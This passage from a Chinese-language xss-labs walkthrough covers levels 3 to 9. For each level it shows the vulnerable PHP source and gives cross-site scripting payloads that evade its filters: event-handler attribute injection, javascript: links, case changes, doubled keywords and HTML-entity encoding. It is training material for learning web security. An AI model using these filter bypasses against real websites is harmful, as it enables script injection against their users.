class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align&#x3D;center&gt;欢迎来到level3&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str &#x3D; $_GET[&quot;keyword&quot;];</span><br><span class="line">echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&quot;&lt;center&gt;</span><br><span class="line">&lt;form action&#x3D;level3.php method&#x3D;GET&gt;</span><br><span class="line">&lt;input name&#x3D;keyword  value&#x3D;&#39;&quot;.htmlspecialchars($str).&quot;&#39;&gt;	</span><br><span class="line">&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;搜索 &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;center&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;center&gt;&lt;img src&#x3D;level3.png&gt;&lt;&#x2F;center&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">echo &quot;&lt;h3 align&#x3D;center&gt;payload的长度:&quot;.strlen($str).&quot;&lt;&#x2F;h3&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>构造内容查看响应</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417114943215.png" alt="image-20200417114943215"></p>
<p>发现和第二关一样，闭合提交</p>
<p>发现，尖括号被转义了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417115114909.png" alt="image-20200417115114909"></p>
<p>所以就不能使用尖括号进行xss了，这里可以使用事件或者伪协议等</p>
<p>事件payload：<code>&#39;onclick=&#39;alert(1)</code></p>
<p>因为这里使用的是onclick所以提交之后需要单击一下输入框才能弹出弹框</p>
<p>如果不想单击使用onmouseover进行提交，提交之后鼠标放到输入框就会弹出</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417115310530.png" alt="image-20200417115310530"></p>
<p>伪协议payload：'onclick='javascript:alert(1)</p>
<p>进行提交，弹出弹框。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417115702177.png" alt="image-20200417115702177"></p>
<h4 id="xss-labs第四关"><a href="#xss-labs第四关" class="headerlink" title="xss-labs第四关"></a>xss-labs第四关</h4><p>源码</p>
<p>分析</p>
<ul>
<li>将用户输入个keyword中的<和>替换为空，但在input标签内并未转义。所以直接闭合input标签中的value（不能闭合整个input标签）并使用不带尖括号但弹框方式即可。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;content-type&quot; content&#x3D;&quot;text&#x2F;html;charset&#x3D;utf-8&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert &#x3D; function()  </span><br><span class="line">&#123;     </span><br><span class="line">confirm(&quot;完成的不错！&quot;);</span><br><span class="line"> window.location.href&#x3D;&quot;level5.php?keyword&#x3D;find a way out!&quot;; </span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level4&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align&#x3D;center&gt;欢迎来到level4&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str &#x3D; $_GET[&quot;keyword&quot;];</span><br><span class="line">$str2&#x3D;str_replace(&quot;&gt;&quot;,&quot;&quot;,$str);</span><br><span class="line">$str3&#x3D;str_replace(&quot;&lt;&quot;,&quot;&quot;,$str2);</span><br><span class="line">echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&#39;&lt;center&gt;</span><br><span class="line">&lt;form action&#x3D;level4.php method&#x3D;GET&gt;</span><br><span class="line">&lt;input name&#x3D;keyword  value&#x3D;&quot;&#39;.$str3.&#39;&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;搜索 &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;center&gt;&#39;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;center&gt;&lt;img src&#x3D;level4.png&gt;&lt;&#x2F;center&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">echo &quot;&lt;h3 align&#x3D;center&gt;payload的长度:&quot;.strlen($str3).&quot;&lt;&#x2F;h3&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>构造内容，响应中查找</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417115758872.png" alt="image-20200417115758872"></p>
<p>进行闭合，尝试，尖括号过滤了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417115832532.png" alt="image-20200417115832532"></p>
<p>使用事件来进行xss尝试</p>
<p>使用单引号闭合的时候发现颜色不一样</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417120155860.png" alt="image-20200417120155860"></p>
<p>在使用双引号</p>
<p>payload：<code>&quot;onclick=&quot;alert(1)</code></p>
<p>成功闭合，伪协议用法相同</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417120248869.png" alt="image-20200417120248869"></p>
<h4 id="xss-labs第五关"><a href="#xss-labs第五关" class="headerlink" title="xss-labs第五关"></a>xss-labs第五关</h4><p>源码</p>
<p>分析</p>
<ul>
<li>对<script和on关键字进行了过滤</li>
<li>第二次引用keyword时没有转义，可以闭合input标签；然后采用不含<script和on的弹框方式</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;content-type&quot; content&#x3D;&quot;text&#x2F;html;charset&#x3D;utf-8&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert &#x3D; function()  </span><br><span class="line">&#123;     </span><br><span class="line">confirm(&quot;完成的不错！&quot;);</span><br><span class="line"> window.location.href&#x3D;&quot;level6.php?keyword&#x3D;break it out!&quot;; </span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level5&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align&#x3D;center&gt;欢迎来到level5&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str &#x3D; strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2&#x3D;str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);</span><br><span class="line">$str3&#x3D;str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&#39;&lt;center&gt;</span><br><span class="line">&lt;form action&#x3D;level5.php method&#x3D;GET&gt;</span><br><span class="line">&lt;input name&#x3D;keyword  value&#x3D;&quot;&#39;.$str3.&#39;&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;搜索 &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;center&gt;&#39;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;center&gt;&lt;img src&#x3D;level5.png&gt;&lt;&#x2F;center&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">echo &quot;&lt;h3 align&#x3D;center&gt;payload的长度:&quot;.strlen($str3).&quot;&lt;&#x2F;h3&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>构造内容，提交</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417122148322.png" alt="image-20200417122148322"></p>
<p>进行闭合尝试，发现对script进行了过滤</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417122411832.png" alt="image-20200417122411832"></p>
<p>尝试构造事件，发现onclick进行了过滤，在中间加了下划线</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417122546166.png" alt="image-20200417122546166"></p>
<p>利用没有过滤尖括号，构造a标签再尝试利用a标签的href属性执行javascript:伪协议，没有对javascript进行过滤，触发xss</p>
<p>payload：<code>&quot;&gt;&lt;a href=&#39;javascript:alert(1)&#39;&gt;</code></p>
<p>复制payload提交，点击超链接</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417123342981.png" alt="image-20200417123342981"></p>
<p>如果感觉这个尖括号不好找的话可以更改</p>
<p>payload：<code>&quot;&gt;&lt;a href=&#39;javascript:alert(1)&#39;&gt;提交&lt;</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417123459136.png" alt="image-20200417123459136"></p>
<p>点击超链接，成功弹框</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417123511122.png" alt="image-20200417123511122"></p>
<h4 id="xss-labs第六关"><a href="#xss-labs第六关" class="headerlink" title="xss-labs第六关"></a>xss-labs第六关</h4><p>源码</p>
<p>分析</p>
<ul>
<li>过滤了<script、on、src、data、href标签</li>
<li>但是替换之前没有转化为小写字母，所以可以用大小写绕过</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;content-type&quot; content&#x3D;&quot;text&#x2F;html;charset&#x3D;utf-8&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert &#x3D; function()  </span><br><span class="line">&#123;     </span><br><span class="line">confirm(&quot;完成的不错！&quot;);</span><br><span class="line"> window.location.href&#x3D;&quot;level7.php?keyword&#x3D;move up!&quot;; </span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level6&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align&#x3D;center&gt;欢迎来到level6&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str &#x3D; $_GET[&quot;keyword&quot;];</span><br><span class="line">$str2&#x3D;str_replace(&quot;&lt;script&quot;,&quot;&lt;scr_ipt&quot;,$str);</span><br><span class="line">$str3&#x3D;str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">$str4&#x3D;str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class="line">$str5&#x3D;str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class="line">$str6&#x3D;str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br><span class="line">echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&#39;&lt;center&gt;</span><br><span class="line">&lt;form action&#x3D;level6.php method&#x3D;GET&gt;</span><br><span class="line">&lt;input name&#x3D;keyword  value&#x3D;&quot;&#39;.$str6.&#39;&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;搜索 &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;center&gt;&#39;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;center&gt;&lt;img src&#x3D;level6.png&gt;&lt;&#x2F;center&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">echo &quot;&lt;h3 align&#x3D;center&gt;payload的长度:&quot;.strlen($str6).&quot;&lt;&#x2F;h3&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>闭合进行查看，script进行了过滤</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417130324942.png" alt="image-20200417130324942"></p>
<p>使用事件进行构造，事件也被过滤了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417130416339.png" alt="image-20200417130416339"></p>
<p>发现和第五关一样，继续使用a标签进行闭合</p>
<p>href被过滤了</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417130529935.png" alt="image-20200417130529935"></p>
<p>因为href被过滤了，进行大小写尝试，提交之后发现遍蓝了，点击超链接</p>
<p>payload：<code>&quot;&gt;&lt;a Href=&#39;javascript:alert(1)&#39;&gt;提交&lt;</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417130621363.png" alt="image-20200417130621363"></p>
<p>页面成功弹框</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417130702200.png" alt="image-20200417130702200"></p>
<h4 id="xss-labs第七关"><a href="#xss-labs第七关" class="headerlink" title="xss-labs第七关"></a>xss-labs第七关</h4><p>源码</p>
<p>分析</p>
<ul>
<li>过滤了script、on、src、data、href，并且在过滤前将keyword转换为了小写</li>
<li>第二处引用keyword没有编码，可以闭合input标签后，重写关键字绕过过滤</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;content-type&quot; content&#x3D;&quot;text&#x2F;html;charset&#x3D;utf-8&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert &#x3D; function()  </span><br><span class="line">&#123;     </span><br><span class="line">confirm(&quot;完成的不错！&quot;);</span><br><span class="line"> window.location.href&#x3D;&quot;level8.php?keyword&#x3D;nice try!&quot;; </span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level7&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align&#x3D;center&gt;欢迎来到level7&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str &#x3D;strtolower( $_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2&#x3D;str_replace(&quot;script&quot;,&quot;&quot;,$str);</span><br><span class="line">$str3&#x3D;str_replace(&quot;on&quot;,&quot;&quot;,$str2);</span><br><span class="line">$str4&#x3D;str_replace(&quot;src&quot;,&quot;&quot;,$str3);</span><br><span class="line">$str5&#x3D;str_replace(&quot;data&quot;,&quot;&quot;,$str4);</span><br><span class="line">$str6&#x3D;str_replace(&quot;href&quot;,&quot;&quot;,$str5);</span><br><span class="line">echo &quot;&lt;h2 align&#x3D;center&gt;没有找到和&quot;.htmlspecialchars($str).&quot;相关的结果.&lt;&#x2F;h2&gt;&quot;.&#39;&lt;center&gt;</span><br><span class="line">&lt;form action&#x3D;level7.php method&#x3D;GET&gt;</span><br><span class="line">&lt;input name&#x3D;keyword  value&#x3D;&quot;&#39;.$str6.&#39;&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;搜索 &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;center&gt;&#39;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;center&gt;&lt;img src&#x3D;level7.png&gt;&lt;&#x2F;center&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">echo &quot;&lt;h3 align&#x3D;center&gt;payload的长度:&quot;.strlen($str6).&quot;&lt;&#x2F;h3&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>过滤了href和script。尝试大小写不能进行绕过。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417142620946.png" alt="image-20200417142620946"></p>
<p>因为href和script被过滤尝试一下双写看看能否绕过</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417143343630.png" alt="image-20200417143343630"></p>
<p>点击超链接，成功弹框</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417143500825.png" alt="image-20200417143500825"></p>
<h4 id="xss-labs第八关"><a href="#xss-labs第八关" class="headerlink" title="xss-labs第八关"></a>xss-labs第八关</h4><p>源码</p>
<p>分析</p>
<ul>
<li><p>在过滤前将keyword转化为小写，并且过滤了script、on、src、data、href、双引号</p>
</li>
<li><p>第一次引用keyword时，采用了htmlspecialchars</p>
</li>
<li><p>第二次引用keyword时，是在a标签中，而且没有用htmlspecialchars编码</p>
</li>
<li><p>考虑编码绕过：hackbar的XSS HTML Characters编码，可将所有字符（不同于htmlspecialchars仅将特殊字符编码）编码为HTML实体，从而绕过过滤。</p>
</li>
<li><p>然后构造弹框语句，注意到编码绕过后，在第二次引用keyword时，虽然没有htmlspecialchars编码，但是我们事先已经自己将提交的keyword编码为html实体了，所以此时输入的标签不会被执行，而是被当作普通字符串，所以只能构造href超链接，而不能闭合a标签。</p>
</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;content-type&quot; content&#x3D;&quot;text&#x2F;html;charset&#x3D;utf-8&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert &#x3D; function()  </span><br><span class="line">&#123;     </span><br><span class="line">confirm(&quot;完成的不错！&quot;);</span><br><span class="line"> window.location.href&#x3D;&quot;level9.php?keyword&#x3D;not bad!&quot;; </span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level8&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align&#x3D;center&gt;欢迎来到level8&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str &#x3D; strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2&#x3D;str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</span><br><span class="line">$str3&#x3D;str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">$str4&#x3D;str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class="line">$str5&#x3D;str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class="line">$str6&#x3D;str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br><span class="line">$str7&#x3D;str_replace(&#39;&quot;&#39;,&#39;&amp;quot&#39;,$str6);</span><br><span class="line">echo &#39;&lt;center&gt;</span><br><span class="line">&lt;form action&#x3D;level8.php method&#x3D;GET&gt;</span><br><span class="line">&lt;input name&#x3D;keyword  value&#x3D;&quot;&#39;.htmlspecialchars($str).&#39;&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;添加友情链接 &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;center&gt;&#39;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span class="line"> echo &#39;&lt;center&gt;&lt;BR&gt;&lt;a href&#x3D;&quot;&#39;.$str7.&#39;&quot;&gt;友情链接&lt;&#x2F;a&gt;&lt;&#x2F;center&gt;&#39;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;center&gt;&lt;img src&#x3D;level8.jpg&gt;&lt;&#x2F;center&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">echo &quot;&lt;h3 align&#x3D;center&gt;payload的长度:&quot;.strlen($str7).&quot;&lt;&#x2F;h3&gt;&quot;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>

<p>javascript关键字被替换。尝试大小写，重复写，无法进行绕过。</p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417144646785.png" alt="image-20200417144646785"></p>
<p>尝试进行Unicode编码</p>
<p>payload：<code>&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#x3A;&amp;#x61;&amp;#x6C;&amp;#x65;&amp;#x72;&amp;#x74;&amp;#x28;&amp;#x31;&amp;#x29;</code></p>
<p><img src="https://gitee.com/zhanqiaozai/picture/raw/master/image-20200417151325070.png" alt="image-20200417151325070"></p>
<h4 id="xss-labs第九关"><a href="#xss-labs第九关" class="headerlink" title="xss-labs第九关"></a>xss-labs第九关</h4><p>查看源码</p>
<p>分析：</p>
<ul>
<li>在过滤前将keyword转化为小写，并且过滤了script、on、src、data、href、双引号</li>
<li>规定在输入中必须包含http://</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;content-type&quot; content&#x3D;&quot;text&#x2F;html;charset&#x3D;utf-8&quot;&gt;</span><br><span class="line">&lt;script&gt;</span><br><span class="line">window.alert &#x3D; function()  </span><br><span class="line">&#123;     </span><br><span class="line">confirm(&quot;完成的不错！&quot;);</span><br><span class="line"> window.location.href&#x3D;&quot;level10.php?keyword&#x3D;well done!&quot;; </span><br><span class="line">&#125;</span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;title&gt;欢迎来到level9&lt;&#x2F;title&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1 align&#x3D;center&gt;欢迎来到level9&lt;&#x2F;h1&gt;</span><br><span class="line">&lt;?php </span><br><span class="line">ini_set(&quot;display_errors&quot;, 0);</span><br><span class="line">$str &#x3D; strtolower($_GET[&quot;keyword&quot;]);</span><br><span class="line">$str2&#x3D;str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</span><br><span class="line">$str3&#x3D;str_replace(&quot;on&quot;,&quot;o_n&quot;,$str2);</span><br><span class="line">$str4&#x3D;str_replace(&quot;src&quot;,&quot;sr_c&quot;,$str3);</span><br><span class="line">$str5&#x3D;str_replace(&quot;data&quot;,&quot;da_ta&quot;,$str4);</span><br><span class="line">$str6&#x3D;str_replace(&quot;href&quot;,&quot;hr_ef&quot;,$str5);</span><br><span class="line">$str7&#x3D;str_replace(&#39;&quot;&#39;,&#39;&amp;quot&#39;,$str6);</span><br><span class="line">echo &#39;&lt;center&gt;</span><br><span class="line">&lt;form action&#x3D;level9.php method&#x3D;GET&gt;</span><br><span class="line">&lt;input name&#x3D;keyword  value&#x3D;&quot;&#39;.htmlspecialchars($str).&#39;&quot;&gt;</span><br><span class="line">&lt;input type&#x3D;submit name&#x3D;submit value&#x3D;添加友情链接 &#x2F;&gt;</span><br><span class="line">&lt;&#x2F;form&gt;</span><br><span class="line">&lt;&#x2F;center&gt;&#39;;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;?php</span><br><span 